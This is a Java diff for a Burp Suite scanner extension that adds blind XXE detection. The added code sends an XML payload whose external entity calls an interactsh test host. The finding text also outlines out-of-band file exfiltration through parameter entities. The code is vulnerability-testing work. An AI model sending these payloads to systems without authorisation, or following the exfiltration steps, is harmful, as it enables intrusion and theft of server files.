@@ -5,6 +5,7 @@ import burp.api.montoya.http.message.requests.HttpRequest;
 import burp.api.montoya.http.message.responses.HttpResponse;
 import com.rx0.burp.model.Finding;
 import com.rx0.burp.model.Severity;
+import com.rx0.burp.scanner.ScanContext;
 import com.rx0.burp.scanner.VulnCheck;
 
 import java.util.ArrayList;
@@ -39,8 +40,44 @@ public class XxeCheck implements VulnCheck {
 
     @Override
     public List<Finding> executar(MontoyaApi api, String baseUrl) {
+        return executar(api, baseUrl, (ScanContext) null);
+    }
+
+    @Override
+    public List<Finding> executar(MontoyaApi api, String baseUrl, ScanContext ctx) {
         List<Finding> achados = new ArrayList<>();
         String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
+
+        // --- Confirmação OOB via interactsh: entidade externa apontando pro nosso host (XXE-via-SSRF) ---
+        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isDisponivel()) {
+            for (String path : PATHS) {
+                try {
+                    String host = ctx.interactsh().criarProbe(
+                            "XXE confirmado via interação out-of-band em " + path,
+                            Severity.CRITICA,
+                            base + path,
+                            "O parser XML do endpoint processou uma entidade externa apontando para um domínio único de teste, " +
+                                    "e a requisição foi efetivamente recebida — confirmação inequívoca de XXE, mesmo quando o " +
+                                    "conteúdo lido não é refletido diretamente na resposta (blind XXE).",
+                            "Desabilite DOCTYPE/entidades externas no parser XML, ou use um parser que não suporte DTDs externas por padrão.",
+                            "1) Reproduza o payload XML apontando a entidade pro domínio de teste. 2) Como confirmou blind XXE, " +
+                                    "use esse mesmo canal pra exfiltrar arquivos: declare uma entidade parameter XML que lê o " +
+                                    "arquivo local e o anexa como parte da URL externa requisitada (XXE OOB data exfiltration).");
+                    if (host != null) {
+                        String payloadOob = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
+                                "<!DOCTYPE rx0 [ <!ENTITY rx0oob SYSTEM \"http://" + host + "/rx0-xxe-oob-probe\"> ]>\n" +
+                                "<root><data>&rx0oob;</data></root>";
+                        HttpRequest reqOob = HttpRequest.httpRequestFromUrl(base + path)
+                                .withMethod("POST")
+                                .withAddedHeader("Content-Type", "application/xml")
+                                .withBody(payloadOob);
+                        api.http().sendRequest(reqOob);
+                    }
+                } catch (Exception e) {
+                    api.logging().logToError("[Rx0] Erro ao disparar probe OOB de XXE (" + path + "): " + e.getMessage());
+                }
+            }
+        }
 
         for (String path : PATHS) {
             try {
